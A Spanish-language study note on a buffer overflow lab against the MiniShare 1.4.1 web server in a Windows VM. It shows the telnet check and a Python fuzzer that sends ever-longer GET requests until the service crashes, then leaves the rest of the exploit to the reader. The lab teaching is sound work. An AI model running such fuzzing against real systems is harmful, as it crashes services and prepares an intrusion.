----
- Tags: #bufferoverflow #x86 #windows #32bytes
-----
# Explicación

Con todo lo que hemos visto en esta sección vamos a explotar un binario llamado **MiniShare** que lo podemos descargar desde este [link](https://es.osdn.net/projects/sfnet_minishare/downloads/OldFiles/minishare-1.4.1.exe/) en la **máquina virtual Windows**, todo esto con el objetivo de reforzar todos los conocimientos que hemos aprendido.

# Pasos a seguir

Una vez descargado e instalado el servicio MiniShare, lo que hará este es montarnos un servicio a través del *puerto 80*, esto lo podemos verificar si hacemos un escaneo simple con ``nmap``, también si nos dirigimos desde nuestra máquina Linux a nuestro navegador y entramos a la web a través de la IP de la máquina windows veremos esto.

![[BOF 36.png]]

Nosotros en nuestro caso lo tendríamos que hacer por la herramienta ``telnet`` que usamos previamente en el anterior ejemplo, esto se debe a que lo tenemos que adecuar al empleo de la **librería** ``socket`` para **python3**.

- ``telnet 192.168.0.120 80``

Colocaríamos ``GET / HTTP/1.1`` daríamos al ``ENTER`` y luego al ``ENTER`` de nuevo.

![[BOF 37.png]]

## Fuzzing

Como siempre la primer etapa es el **Fuzzing**, por lo tanto lo que haremos será utilizar el Immunity Debugger para *Attach* al servicio **MiniShare**, de esta manera podremos ver todos los procesos a bajo nivel.

```python
#!/usr/bin/python3

from struct import pack
import socket
import sys
import os

# Variables globales
ip_address = "192.168.0.120"
port = 80

def exploit():
    
    total_length = 100

    while True:

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(7)

            s.connect((ip_address, port))

            print("\n[+] Enviando %d bytes" % total_length)

            s.send(b"GET " + b"A"*total_length + b" HTTP/1.1\r\n\r\n")
            s.recv(1024)
            s.close()

            total_length += 100

        except:
            print("\n[!] El programa se ha detenido.")
            print("\n[i] Ha crasheado con un total de %d bytes" % total_length)
            sys.exit(1)

if __name__ == '__main__':
    
    exploit()

```

A partir de acá es cuestión de aplicar todo lo aprendido, suerte!